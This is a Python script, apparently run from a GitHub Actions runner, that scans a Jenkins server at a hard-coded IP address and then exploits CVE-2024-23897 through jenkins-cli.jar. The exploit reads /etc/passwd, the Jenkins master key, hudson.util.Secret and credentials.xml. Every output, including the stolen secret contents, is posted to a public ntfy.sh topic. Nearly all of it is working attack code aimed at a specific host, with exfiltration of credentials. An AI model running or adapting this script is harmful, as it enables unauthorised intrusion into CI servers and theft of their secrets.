#!/usr/bin/env python3
# GHA runner: read-oriented probe of Jenkins CI at 51.222.15.95:8080
import os, sys, json, time, socket, subprocess, urllib.request

HOST = "51.222.15.95"
PORT = 8080
TOPIC = os.environ.get("TOPIC", "i47089jenkins-probe")

def log(*a):
    print(" ".join(str(x) for x in a), flush=True)

def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3800):
        try:
            req = urllib.request.Request(
                "https://ntfy.sh/" + TOPIC,
                data=("[%s %d] " % (tag, i // 3800 + 1) + text[i:i+3800]).encode("utf-8", "replace"),
                method="POST", headers={"Title": tag[:60]})
            urllib.request.urlopen(req, timeout=15).read()
        except Exception as e:
            print("NTFYERR", str(e)[:80], flush=True)

def egress():
    for u in ("https://api.ipify.org", "https://ifconfig.me/ip"):
        try:
            return urllib.request.urlopen(u, timeout=12).read().decode().strip()
        except Exception:
            pass
    return "ERR"

def tcp(host, port, to=8):
    t0 = time.time()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(to)
    try:
        s.connect((host, port)); s.close()
        return "OPEN", round((time.time()-t0)*1000)
    except socket.timeout:
        return "TIMEOUT", round((time.time()-t0)*1000)
    except ConnectionRefusedError:
        return "REFUSED", round((time.time()-t0)*1000)
    except Exception as e:
        return "ERR:" + type(e).__name__, round((time.time()-t0)*1000)

def http(url, to=10, extra=None):
    cmd = ["curl", "-s", "-m", str(to), "-i", "--path-as-is", url]
    for h in (extra or []):
        cmd[1:1] = ["-H", h]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=to+5)
        return p.stdout
    except Exception as e:
        return "CURLERR:" + str(e)[:100]

def main():
    log("=== JENKINS PROBE", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
    eg = egress(); log("EGRESS", eg)
    send("EGRESS", eg)

    results = {}
    # Reachability: target + controls
    targets = [(HOST, PORT), (HOST, 443), (HOST, 80), (HOST, 50000), (HOST, 8081), (HOST, 8082),
               ("40.160.50.80", 3000), ("51.210.13.182", 8000), ("1.1.1.1", 443)]
    for h, p in targets:
        st, ms = tcp(h, p)
        key = "%s:%d" % (h, p)
        results[key] = (st, ms)
        log("TCP", key, st, str(ms) + "ms")
    send("TCP", json.dumps({k: v[0] for k, v in results.items()}))

    reachable = results.get("%s:%d" % (HOST, PORT), ("",))[0] == "OPEN"
    log("JENKINS_8080_REACHABLE", reachable)
    if not reachable:
        # try 443 (maybe behind TLS proxy)
        send("VERDICT", "8080 NOT reachable from runner egress %s; tcp=%s" % (eg, results.get("%s:%d" % (HOST, PORT))))
        log("VERDICT_8080_UNREACHABLE")
        # still, if 443 open, do an https probe
        if results.get("%s:443" % HOST, ("",))[0] == "OPEN":
            r = http("https://%s/" % HOST, extra=["-k"])
            log("HTTPS_ROOT_HEAD", r[:800].replace("\n", " | "))
            send("HTTPS443", r[:1500])
        return

    base = "http://%s:%d" % (HOST, PORT)
    # Fingerprint + anonymous surface
    probes = {
        "/": base + "/",
        "/login": base + "/login",
        "/api/json": base + "/api/json",
        "/whoAmI/api/json": base + "/whoAmI/api/json",
        "/manage": base + "/manage",
        "/jnlpJars/jenkins-cli.jar": base + "/jnlpJars/jenkins-cli.jar",
        "/script": base + "/script",
        "/computer/api/json": base + "/computer/api/json",
    }
    findings = {}
    for path, url in probes.items():
        r = http(url, to=12)
        findings[path] = r
        # print status line + key headers
        head = r.split("\r\n\r\n")[0]
        status = head.split("\r\n")[0] if head else "(no resp)"
        xjen = [l for l in head.split("\r\n") if l.lower().startswith("x-jenkins") or l.lower().startswith("x-jenkins-cli-port") or l.lower().startswith("server:") or l.lower().startswith("location:") or l.lower().startswith("x-frame")]
        log("HTTP", path, status, " || ".join(xjen)[:300])
        send("HTTP_" + path.replace("/", "_"), status + "\n" + "\n".join(xjen) + "\nBODY:" + r.split("\r\n\r\n", 1)[-1][:600])

    # CVE-2024-23897 attempt
    try:
        log("=== install java + download cli jar ===")
        subprocess.run("apt-get install -y -qq default-jre-headless >/dev/null 2>&1 || sudo apt-get install -y -qq default-jre-headless >/dev/null 2>&1", shell=True, timeout=180)
        jar = "/tmp/jenkins-cli.jar"
        dl = http(base + "/jnlpJars/jenkins-cli.jar", to=30)
        # http() adds -i (headers) which corrupts jar; re-download clean
        subprocess.run(["curl", "-s", "-m", "60", "-o", jar, base + "/jnlpJars/jenkins-cli.jar"], timeout=80)
        sz = os.path.getsize(jar) if os.path.exists(jar) else 0
        log("CLI_JAR_BYTES", sz)
        send("CLI_JAR", "bytes=%d" % sz)
        java = subprocess.run(["bash", "-lc", "which java"], capture_output=True, text=True).stdout.strip()
        log("JAVA", java)
        if sz > 10000 and java:
            # CVE-2024-23897: server-side args4j @file expansion
            read_targets = ["/etc/passwd", "/var/jenkins_home/secrets/master.key",
                            "/var/jenkins_home/secrets/hudson.util.Secret",
                            "/var/jenkins_home/credentials.xml"]
            for tgt in read_targets:
                for sub in ("connect-node", "help"):
                    cmd = [java, "-jar", jar, "-s", base + "/", "-noCertificateCheck", "-noping", sub, "@" + tgt]
                    try:
                        p = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                        out = (p.stdout + p.stderr)
                        log("CVE23897", tgt, sub, "rc=%d" % p.returncode)
                        log("CVE23897_OUT", out[:1500].replace("\n", " | "))
                        send("CVE23897_" + sub + "_" + tgt.replace("/", "_"), "rc=%d\n%s" % (p.returncode, out[:2000]))
                    except Exception as e:
                        log("CVE23897_ERR", tgt, sub, str(e)[:100])
    except Exception as e:
        log("CVE_SECTION_ERR", str(e)[:200])

    log("DONE")
    send("DONE", "probe complete egress=%s reachable=%s" % (eg, reachable))

if __name__ == "__main__":
    main()
